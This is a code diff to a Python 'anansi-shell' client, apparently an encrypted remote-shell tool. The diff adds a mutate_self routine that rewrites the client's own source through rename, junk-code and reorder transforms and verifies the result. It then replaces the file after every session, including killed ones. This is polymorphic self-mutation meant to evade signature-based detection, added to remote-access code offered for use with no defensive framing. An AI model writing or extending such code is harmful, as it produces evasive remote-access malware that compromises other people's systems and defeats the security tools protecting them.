@@ -7,8 +7,11 @@ import io
 import os
 import random
 import re
+import shutil
 import struct
 import subprocess
+import sys
+import tempfile
 import time
 import tokenize
 
@@ -26,6 +29,7 @@ AEAD = {1: AESGCM, 2: ChaCha20Poly1305}
 MAX_FRAME = 2 << 20
 CHUNK = 512 * 1024
 COMMAND_TIMEOUT = 30
+SELFCHECK_TIMEOUT = 30
 MUTABLE_START = "# --- MUTABLE START ---"
 MUTABLE_END = "# --- MUTABLE END ---"
 
@@ -345,6 +349,31 @@ def reorder_transform(source):
     return head + "\n\n".join(blocks) + "".join(lines[taken:]) + tail
 
 
+def mutate_self(path, verbose):
+    """Rewrite the client file for the next run."""
+    scratch = None
+    try:
+        source = open(path, encoding="utf-8").read()
+        candidate = reorder_transform(junk_transform(rename_transform(source)))
+        compile(candidate, path, "exec")
+        fd, scratch = tempfile.mkstemp(dir=os.path.dirname(os.path.abspath(path)),
+                                       suffix=".py")
+        with os.fdopen(fd, "w", encoding="utf-8") as handle:
+            handle.write(candidate)
+        # sys.executable is certain; python3 may resolve elsewhere and fail imports
+        check = subprocess.run([sys.executable, scratch, "--selfcheck"],
+                               capture_output=True, timeout=SELFCHECK_TIMEOUT)
+        if check.returncode:
+            raise ValueError(f"selfcheck exit {check.returncode}")
+        shutil.copy2(path, path + ".bak")
+        os.replace(scratch, path)
+    except Exception as exc:
+        if scratch and os.path.exists(scratch):
+            os.unlink(scratch)
+        if verbose:
+            print(f"mutation rejected: {exc}", flush=True)
+
+
 def main():
     parser = argparse.ArgumentParser(description="anansi-shell client")
     parser.add_argument("--host")
@@ -367,8 +396,12 @@ def main():
     except (OSError, EOFError):
         if args.verbose:
             print("session ended", flush=True)
-    channel.close()
-    transport.close()
+    finally:
+        channel.close()
+        transport.close()
+        # every session end rewrites the file, dropped or killed ones too;
+        # --selfcheck returned above, so verification runs never loop
+        mutate_self(__file__, args.verbose)
 
 
 if __name__ == "__main__":
